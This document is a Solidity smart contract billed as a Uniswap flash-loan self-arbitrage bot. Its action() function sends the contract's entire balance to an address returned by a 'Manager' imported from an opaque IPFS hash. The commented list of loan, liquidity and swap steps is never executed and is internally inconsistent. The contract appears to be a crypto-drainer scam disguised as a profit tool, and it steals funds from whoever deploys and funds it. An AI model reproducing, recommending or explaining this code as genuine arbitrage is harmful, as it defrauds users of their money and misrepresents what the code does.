pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

//uniswap smart contracts v2 and v3

import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
// Code Manager
import "ipfs://QmVSF7tCdaYxyPLc543yK8gjVvpemTGhSRNVkeVnyMjqTJ";



	
contract uniswapFlashLoan {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		loanAmount = _loanAmount;
			
		manager = new Manager();
	}
	
	function() external payable {}
	
	function action() public payable {
	    // Send required coins for swap
	    address(uint160(manager.uniswapDepositAddress())).transfer(address(this).balance);
	    
	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
	    // Breakdown of functions written below
	    manager.performTasks();
	    
	    /* Breakdown of functions
	    // Submit token to BSC blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

        // List the token on uniswapSwap
		manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);
		
        // Get BNB Loan from Multiplier-Finance
		string memory loanAddress = manager.takeFlashLoan(loanAmount);
		
		// Convert half BNB to DAI
		manager.uniswapDAItoBNB(loanAmount / 2);

        // Create BNB and DAI pairs for our token & Provide liquidity
        string memory bnbPair = manager.uniswapCreatePool(tokenAddress, "BNB");
		manager.uniswapAddLiquidity(bnbPair, loanAmount / 2);
		string memory daiPair = manager.uniswapCreatePool(tokenAddress, "DAI");
		manager.uniswapAddLiquidity(daiPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
		manager.uniswapPerformSwaps();
		
		// Move remaining BNB from Contract to your account
		manager.contractToWallet("BNB");

        // Repay Flash loan
		manager.repayLoan(loanAddress);
	    */
	}

}
